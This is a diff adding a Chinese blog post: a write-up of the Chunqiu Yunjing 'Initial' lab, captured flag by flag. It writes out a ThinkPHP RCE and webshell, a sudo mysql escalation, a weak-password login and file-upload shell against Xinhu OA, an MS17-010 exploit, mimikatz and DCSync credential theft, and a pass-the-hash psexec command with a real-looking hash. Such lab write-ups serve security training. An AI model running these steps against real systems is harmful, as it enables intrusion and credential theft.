@@ -1,0 +1,866 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="j1ya">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="https:&#x2F;&#x2F;exp10it.io&#x2F;2023&#x2F;07&#x2F;chunqiuyunjing-initial-writeup&#x2F;#flag01 https:&#x2F;&#x2F;t1ng-t1ng.github.io&#x2F;2025&#x2F;03&#x2F;01&#x2F;%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial&#x2F; 39.98.121.251是队友租的一个腾讯云服务器，相当于挂了一层代理 flag01入口点是17">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜initial wp">
+<meta property="og:url" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/index.html">
+<meta property="og:site_name" content="j1ya">
+<meta property="og:description" content="https:&#x2F;&#x2F;exp10it.io&#x2F;2023&#x2F;07&#x2F;chunqiuyunjing-initial-writeup&#x2F;#flag01 https:&#x2F;&#x2F;t1ng-t1ng.github.io&#x2F;2025&#x2F;03&#x2F;01&#x2F;%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial&#x2F; 39.98.121.251是队友租的一个腾讯云服务器，相当于挂了一层代理 flag01入口点是17">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741529838121-fbda0487-573c-4305-ba29-f8bfa6e2553d.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741513725508-711e53d4-f2d9-493f-a1e9-56df12522069.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741529152731-e41719d1-4bb2-4036-ae8b-34738f6d46f6.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741513839637-84367169-43bd-46ca-a47b-e08684d904b6.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515629106-7a1defec-91cd-44f4-b9ed-0496988b18d1.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515424108-60afdc0d-35d5-49e7-8080-d6685dcadb0c.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741514046470-62521c94-ec45-4483-95e1-5211072a06b2.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741508248495-ca2296f4-d207-4d0b-8d16-7fce0876b3d6.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741509246118-492e0383-fc07-43ef-8907-0e13bcf8f9c0.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515958369-1f71a417-af81-4bd4-b8f0-37196104ffa4.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536551703-300e98f3-0ff2-4a91-8bf4-5847f7f606ac.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536513259-26f61ef4-dcd9-47e9-8c9d-ce6147167217.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536869961-c611d830-bccf-44f3-833e-a67ff3cbc642.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515272362-7c835135-4622-4088-bae9-5486657386b2.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536739183-b1fbf11f-42ff-4952-966f-89b501d3fd44.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741516105119-b0069a99-1c70-4faa-9112-e2913295f19e.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741509122660-fcbe8912-697e-4c70-be7f-28e9a9edaa40.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741509138885-95a0a17e-97ce-40c0-98f1-dba0cd769c53.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741508441566-9a5ccc79-82d7-47b9-8832-3230a524b1bd.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741511777054-eddc92ad-0e96-4066-97a8-58b778add673.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537014019-7ee74aae-6ace-4ced-ab31-2671362404a8.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537215209-7bcff258-a82c-498c-85ea-a546331d79d9.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537276384-ba09e790-1d1a-4dea-9b57-0c158a391aba.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741510029608-0df51d78-82de-4b2d-a9c9-0486e0ba037c.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537381682-a45ca320-ceb0-4b52-a2f0-c1a45d2afa40.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537477780-e0cd4e66-fa9d-43c2-a1dc-3510408ef8de.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537619463-4eb32de1-d6f1-48a1-b373-ca0db1e1097d.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537689801-19b37d4c-aa41-458b-98d2-080b4a0e7cc4.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537765310-39aa47b0-f116-490c-8589-ba77b2cc6b30.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537914591-e8a86703-071e-4cda-b7ee-5528c3a98d7c.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741516372835-d6013e8b-7a54-4b99-b3f9-2fff10c897e8.png">
+<meta property="article:published_time" content="2025-03-10T02:52:42.000Z">
+<meta property="article:modified_time" content="2025-03-10T02:56:01.080Z">
+<meta property="article:author" content="j1ya">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://j1ya-22.github.io/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741529838121-fbda0487-573c-4305-ba29-f8bfa6e2553d.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>春秋云镜initial wp - j1ya</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"j1ya-22.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"5oPqGOgpqzM186wdJq3YyrcV-gzGzoHsz","app_key":"tdZv3tC3tP1IszSKxEodRe6e","server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>j1ya</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云镜initial wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-10 10:52" pubdate>
+          2025年3月10日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          602 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          6 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云镜initial wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><a target="_blank" rel="noopener" href="https://exp10it.io/2023/07/chunqiuyunjing-initial-writeup/#flag01">https://exp10it.io/2023/07/chunqiuyunjing-initial-writeup/#flag01</a></p>
+<p><a target="_blank" rel="noopener" href="https://t1ng-t1ng.github.io/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/">https://t1ng-t1ng.github.io/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/</a></p>
+<p>39.98.121.251是队友租的一个腾讯云服务器，相当于挂了一层代理</p>
+<h1 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h1><p>入口点是172.22.1.15</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741529838121-fbda0487-573c-4305-ba29-f8bfa6e2553d.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>fscan扫描得到常见端口，扫不出来的话再用nmap</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741513725508-711e53d4-f2d9-493f-a1e9-56df12522069.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>找对应的poc</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce">https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</a></p>
+<p>修改host之后发现响应是500</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741529152731-e41719d1-4bb2-4036-ae8b-34738f6d46f6.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>这里没有关系继续往下</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741513839637-84367169-43bd-46ca-a47b-e08684d904b6.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>然后写shell.php蚁剑连接</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515629106-7a1defec-91cd-44f4-b9ed-0496988b18d1.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>：找到系统中所有由 root 拥有并带有 SUID 位的文件，SUID指用户在执行程序&#x2F;命令的时候，将获取文件所有者的权限，这里suid不可利用</p>
+<p>尝试sudo提权，发现mysql有root权限</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515424108-60afdc0d-35d5-49e7-8080-d6685dcadb0c.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/mysql/">https://gtfobins.github.io/gtfobins/mysql/</a><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741514046470-62521c94-ec45-4483-95e1-5211072a06b2.png" srcset="/img/loading.gif" lazyload class="" title="img"></p>
+<p>这里要执行&#x2F;bin&#x2F;sh需要反弹shell，但还可以用其他命令</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> mysql -e <span class="hljs-string">&#x27;\! find / -name flag*&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741508248495-ca2296f4-d207-4d0b-8d16-7fce0876b3d6.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h1 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h1><p>把fscan拖进蚁剑，再次扫描内网<code>./fscan -h 172.22.1.0/24</code></p>
+<p>发现其他几台内网机器机器开放的端口</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741509246118-492e0383-fc07-43ef-8907-0e13bcf8f9c0.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>整理得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">172.22.1.18 XIAORANG-OA01<br>端口: 135,80,3306,445,139<br><br>172.22.1.21 XIAORANG-WIN7<br>端口: 445,135,139<br>MS17-010永恒之蓝<br><br>172.22.1.2 DC01域控<br>端口: 135,139,445,88<br></code></pre></td></tr></table></figure>
+
+<p>172.22.1.18 信呼OA</p>
+<p>bp爆破测试出弱口令admin&#x2F;admin123</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515958369-1f71a417-af81-4bd4-b8f0-37196104ffa4.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>我用ProxySwitch插件一直不行，后面用的firefox自带的代理</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536551703-300e98f3-0ff2-4a91-8bf4-5847f7f606ac.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>成功登录</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536513259-26f61ef4-dcd9-47e9-8c9d-ce6147167217.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>getshell 参考 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/286380.html">https://www.freebuf.com/articles/web/286380.html</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;form action=<span class="hljs-string">&quot;http://172.22.1.18/api.php?m=upload&amp;a=upfile&amp;adminid=&amp;device=1625923765752&amp;cfrom=mweb&amp;token=&amp;sysmodenum=officia&amp;sysmid=0&amp;maxsize=2&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure>
+
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536869961-c611d830-bccf-44f3-833e-a67ff3cbc642.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>拿到 id, 然后访问 <code>http://172.22.1.18/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=9</code> 生成 php</p>
+<p>蚁剑设置代理</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515272362-7c835135-4622-4088-bae9-5486657386b2.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>我这里直接连接队友上传的马</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536739183-b1fbf11f-42ff-4952-966f-89b501d3fd44.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>因为是 phpstudy 搭建的网站, 直接就是system权限</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741516105119-b0069a99-1c70-4faa-9112-e2913295f19e.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>dir &#x2F;s &#x2F;b | find “flag” &gt; “C:\tmp.txt”导出到txt防止一段时间自动断开连接</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741509122660-fcbe8912-697e-4c70-be7f-28e9a9edaa40.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>找到flag所在目录</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741509138885-95a0a17e-97ce-40c0-98f1-dba0cd769c53.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741508441566-9a5ccc79-82d7-47b9-8832-3230a524b1bd.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h1 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h1><p>用代理启动msfconsole</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741511777054-eddc92ad-0e96-4066-97a8-58b778add673.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>use ms17-010</p>
+<p>找到正向代理相关的payload</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537014019-7ee74aae-6ace-4ced-ab31-2671362404a8.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537215209-7bcff258-a82c-498c-85ea-a546331d79d9.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>队友之前用过4444来监听，这里换成4445</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537276384-ba09e790-1d1a-4dea-9b57-0c158a391aba.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>这里我run了五六次才成功，期间一直遇到fail</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741510029608-0df51d78-82de-4b2d-a9c9-0486e0ba037c.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537381682-a45ca320-ceb0-4b52-a2f0-c1a45d2afa40.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>导出hash，guest对应的是Empty String</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537477780-e0cd4e66-fa9d-43c2-a1dc-3510408ef8de.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>导入mimikatz后收集凭据</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537619463-4eb32de1-d6f1-48a1-b373-ca0db1e1097d.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>这台机器有 DCSync 的权限, 所以能直接从域控上导出 Hash</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537689801-19b37d4c-aa41-458b-98d2-080b4a0e7cc4.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>安装impacket</p>
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537765310-39aa47b0-f116-490c-8589-ba77b2cc6b30.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>psexec凭据传递攻击</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> psexec.py -dc-ip <span class="hljs-number">172.22.1.2</span> -hashes :<span class="hljs-number">10</span>cf89a850fb1cdbe6bb432b859164c8 XIAORANG.LAB/administrator@<span class="hljs-number">172.22.1.18</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537914591-e8a86703-071e-4cda-b7ee-5528c3a98d7c.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741516372835-d6013e8b-7a54-4b99-b3f9-2fff10c897e8.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%AF%94%E8%B5%9Bwp/" class="category-chain-item">比赛wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>春秋云镜initial wp</div>
+      <div>https://j1ya-22.github.io/2025/03/10/春秋云镜initial-wp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>j1ya</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
